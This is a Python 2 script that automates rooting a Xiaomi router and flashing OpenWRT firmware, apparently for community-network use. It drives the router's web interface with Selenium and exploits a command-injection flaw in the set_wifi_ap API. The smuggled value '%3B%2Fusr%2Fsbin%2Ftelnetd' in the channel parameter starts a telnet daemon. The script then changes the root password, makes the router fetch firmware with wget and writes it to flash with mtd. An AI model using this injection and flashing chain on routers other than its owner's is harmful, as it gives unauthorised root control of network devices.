#!/usr/bin/env python2

"""
Use browser scripting to control a Xiaomi router via the original web interface.
Abuse vulnerability to get Telnet access. Replace firmware with custom OpenWRT.

(c) 2016 Oleander Reis, Christoph Scheid, Tobias Weber
"""

import argparse
import logging  # TODO add everywhere.
import os
import re
import shutil
import SimpleHTTPServer
import SocketServer
import subprocess
import sys
import telnetlib
import tempfile
import threading
import time
import urlparse

import requests
import selenium
import selenium.webdriver

NotFound = selenium.common.exceptions.NoSuchElementException
RETURN = selenium.webdriver.common.keys.Keys.RETURN

ABUSE = ("http://{}/cgi-bin/luci/;stok={}/api/xqnetwork/"
    "set_wifi_ap?ssid=whatever&encryption=NONE&enctype=NONE&"
    "channel=1%3B%2Fusr%2Fsbin%2Ftelnetd")  # TODO urllib.quote_plus
PASSWD = ("http://{}/cgi-bin/luci/;stok={}/api/xqsystem/"
    "set_name_password?oldPwd={}&newPwd={}")

def mirror(url, path):
    return subprocess.call(['/usr/bin/curl', '--silent',
        '--time-cond', path, '--output', path, url])  # 0.

def initial_setup(driver, address, key, password):
    """
    Return True or an error string.
    """
    driver.get('http://%s' % address)
    if 'xiaoqiang' not in driver.page_source:
        return 'page not recognized'  # TODO exceptions.
    try:
        driver.find_element_by_id('password')
        return 'already set up'
    except NotFound:
        pass
    try:
        driver.find_element_by_id('btnStart').click()
        time.sleep(15)
        driver.find_element_by_xpath("//a[@data-to='pppoeorssidpwd']").click()
        time.sleep(5)
    except NotFound:
        return 'page lacks button'
    try:
        field = driver.find_element_by_name('wifipwd')
        field.click()
        field.send_keys(key)
        field.send_keys(RETURN)
        time.sleep(3)
    except NotFound:
        return 'page lacks key field'
    try:
        field = driver.find_elements_by_name('routerpwd')[1]
        field.click()
        field.send_keys(password)
        time.sleep(1)
        field.send_keys(RETURN)
        time.sleep(10)
    except (NotFound, IndexError):
        return 'page lacks password field'
    PROGRESS = 'Setting up'
    if PROGRESS not in driver.page_source:
        return 'saving password took too long'
    while PROGRESS in driver.page_source:
        time.sleep(5)  # TODO timeout.
    return True

def login(driver, address, password):
    """
    Return token or False.
    """
    driver.get('http://%s' % address)
    try:
        field = driver.find_element_by_id('password')
        field.click()
        field.send_keys(password)
        field.send_keys(RETURN)
        time.sleep(10)
    except NotFound:
        return False  # TODO exceptions.
    match = re.search(r'stok=([a-f0-9]+)', driver.current_url)
    if not match:
        return False
    return match.group(1)

def setup_telnet(driver, address, token, password, new):
    """
    Abuse vulnerability to start telnet server.
    Change password to enable shell access.
    """
    driver.get(ABUSE.format(address, token))
    while "Probe timeout" not in driver.page_source:
        time.sleep(5)  # TODO timeout.
    driver.get(PASSWD.format(address, token, password, new))
    while '{"code":0}' not in driver.page_source:
        time.sleep(5)

class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    pass

def start_server_thread(address):
    """
    Returns an instance which supports .server_address to get the port
    and .shutdown() to join the thread.

    Serves files in the current working directory. TODO specify directory.
    TODO disable logging.
    """
    server = ThreadedTCPServer((address, 0), SimpleHTTPServer.SimpleHTTPRequestHandler)

    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()

    return server

def find_firmware(manifest, model):
    for line in manifest.splitlines():
        fields = line.split()
        if len(fields) < 4:
            continue
        if fields[0] == model:
            return fields[2:4]  # SHA512SUM, filename
    return None, None  # Avoid ValueError.

def get_firmware(manifest, model, path):
    try:
        resp = requests.get(manifest)
    except:
        return False
    _, fname = find_firmware(resp.text, model)
    url = urlparse.urljoin(manifest, fname)
    return mirror(url, path) == 0

def enter_credentials(telnet, user, password):
    telnet.read_until("login: ")
    telnet.write(user + "\n")
    telnet.read_until("assword: ")  # Should be upper case P.
    telnet.write(password + "\n")

def upload(telnet, path):
    REMOTE = '/tmp'
    telnet.write('cd %s \n' % REMOTE)

    dirname, basename = os.path.split(path)
    os.chdir(dirname)
    local, _ = telnet.get_socket().getsockname()
    server = start_server_thread(local)
    local, port = server.server_address  # This shouldn't change local.
    telnet.write('wget --quiet http://%s:%i/%s \n' % (local, port, basename))
    telnet.read_until('#')
    server.shutdown()

    return os.path.join(REMOTE, basename)

def flash(telnet, path):
    telnet.write("mtd -r write %s OS1 \n" % path)
    # TODO confirm success.

def parser():
    p = argparse.ArgumentParser()
    p.add_argument('--address', default='192.168.31.1',  # Xiaomi default.
        help='where to find the router')
    p.add_argument('--password', default='password',  # TODO random.
        help='used for WiFi, LuCI, Telnet')
    p.add_argument('--manifest', default="https://firmware.marburg.freifunk.net/"
        "experimental/sysupgrade/experimental.manifest",
        help='where to find firmware')
    p.add_argument('--model', default="xiaomi-miwifi-mini",
        help='which firmware to use')
    p.add_argument('--firmware',
        help='path to the file (enables caching)')
    p.add_argument('--force', action='store_true', default=False,
        help="do not update the cache")
    p.add_argument('--skip', action='append', default=[],
        choices='setup crack upload flash'.split(),
        help='what not to do')
    return p

if __name__ == '__main__':
    args = parser().parse_args()  # TODO def main()

    temp = None
    if not args.firmware:
        temp = tempfile.mkdtemp()
        args.firmware = os.path.join(temp, 'fw.bin')

    if 'setup' not in args.skip or 'crack' not in args.skip:
        # TODO use constants to fail early.
        driver = selenium.webdriver.Firefox()  # TODO only import selenium here.
        driver.set_window_size(800, 600)
    if 'setup' not in args.skip:
        if initial_setup(driver, args.address, args.password, args.password) is not True:
            sys.exit(1)
    if 'crack' not in args.skip:
        token = login(driver, args.address, args.password)
        setup_telnet(driver, args.address, token, args.password, args.password)
    if 'upload' not in args.skip:
        try:
            telnet = telnetlib.Telnet(args.address)
        except:
            sys.exit(2)
        enter_credentials(telnet, 'root', args.password)  # TODO error handling.
        telnet.read_until('#')

        get_firmware(args.manifest, args.model, args.firmware)
        remote = upload(telnet, args.firmware)

        if 'flash' not in args.skip:  # TODO handle flash without upload.
            flash(telnet, remote)

        telnet.close()

    try:
        driver.close()
    except:
        pass

    if temp:
        shutil.rmtree(temp)
